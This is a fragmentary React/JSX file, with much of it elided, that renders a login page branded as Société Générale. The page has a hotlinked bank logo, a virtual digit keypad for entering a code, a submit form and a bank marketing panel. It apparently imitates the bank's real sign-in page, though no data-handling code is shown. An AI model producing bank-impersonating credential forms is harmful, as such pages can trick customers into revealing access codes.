        ...
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-gray-900 mb-6" />
  ...
  return (
    <div className="min-h-screen bg-white">
      <div className="grid grid-cols-1 lg:grid-cols-2 min-h-screen">
          ...
          <div className="max-w-md mx-auto w-full">
            ...
            <div className="flex items-center justify-between mb-8">
              <div className="flex items-center">
                <img 
                  src="https://logos-world.net/wp-content/uploads/2021/02/Societe-Generale-Logo.png" 
            ...
            <form onSubmit={handleSubmit} className="space-y-6">
                  ...
                  <div className="space-y-2 max-w-xs mx-auto">
                    ...
                    <div className="flex justify-center space-x-2">
                      <button
                        ...
                        className="w-12 h-12 bg-gray-200 hover:bg-gray-300 rounded text-lg font-bold transition-colors"
                      >
                        0
                      </button>
                      <button
              ...
              <button
                ...
                className="w-full bg-gray-900 text-white font-semibold py-4 rounded hover:bg-black disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
              >
        ...
        {/* Right Panel - Black Background with Gold Accent */}
        <div className="bg-gradient-to-br from-gray-900 to-black p-4 lg:p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto w-full">
            <h2 className="text-3xl lg:text-4xl font-bold mb-8" style={{ color: '#D4AF37' }}>
              Société Générale, banque universelle
            </h2>

            {/* Insurance Section */}
            <div className="bg-black bg-opacity-50 rounded-lg p-6 mb-8 border border-yellow-600">
              ...
              <div className="space-y-3">
                <button className="text-yellow-500 underline text-sm hover:text-yellow-400">
                  Découvrir nos services
                </button>
                <br />
                <button className="bg-gray-800 hover:bg-gray-700 text-white px-6 py-2 rounded transition-colors border border-yellow-600">
            ...
            <div className="text-gray-300 text-sm space-y-2">
              <p>• Banque universelle depuis 1864</p>
